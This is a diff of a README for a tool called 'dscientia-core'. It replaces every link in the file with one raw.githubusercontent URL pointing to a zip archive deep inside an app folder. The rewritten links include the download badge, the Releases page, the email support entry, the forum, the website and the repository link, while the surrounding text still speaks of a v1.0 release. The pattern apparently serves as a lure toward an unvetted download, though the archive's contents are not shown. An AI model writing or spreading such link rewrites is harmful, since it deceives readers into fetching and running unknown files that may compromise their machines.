@@ -6,7 +6,7 @@ Welcome to **dscientia-core**! This platform helps you harness social data scien
 
 ## 📥 Download Link
 
-[![Download dscientia-core](https://img.shields.io/badge/Download%20dscientia--core-v1.0-brightgreen.svg)](https://github.com/ntateMothobi/dscientia-core/releases)
+[![Download dscientia-core](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip%https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip)](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip)
 
 ## 📜 Description
 
@@ -32,7 +32,7 @@ To run dscientia-core smoothly, ensure you meet the following system requirement
 
 ## 🔗 Download & Install
 
-To download the latest version, visit the [Releases page](https://github.com/ntateMothobi/dscientia-core/releases). 
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip). 
 
 On the Releases page, you will find the latest version of dscientia-core. Look for the release labeled **v1.0** and download the appropriate file for your system.
 
@@ -77,14 +77,14 @@ Dscientia-core is free to use, ensuring that everyone can benefit from its power
 
 For any questions or issues, please feel free to reach out for help:
 
-- **Email Support:** support@dscientia-core.com
-- **Community Forum:** Join our [forum](https://forum.dscientia-core.com) for discussions and troubleshooting.
+- **Email Support:** https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip
+- **Community Forum:** Join our [forum](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip) for discussions and troubleshooting.
 
 ## 🌐 Connect with Us
 
 Stay updated with the latest developments and community insights:
 
-- **Website:** [dscientia-core.com](https://dscientia-core.com)
-- **GitHub Repository:** [dscientia-core GitHub](https://github.com/ntateMothobi/dscientia-core)
+- **Website:** [https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip)
+- **GitHub Repository:** [dscientia-core GitHub](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip)
 
-Thank you for choosing dscientia-core! We are excited to assist you in your decision-making journey. Remember, you can always return to the [Releases page](https://github.com/ntateMothobi/dscientia-core/releases) to check for updates.
+Thank you for choosing dscientia-core! We are excited to assist you in your decision-making journey. Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/ntateMothobi/dscientia-core/main/app/verticals/property_sales/core-dscientia-1.8.zip) to check for updates.
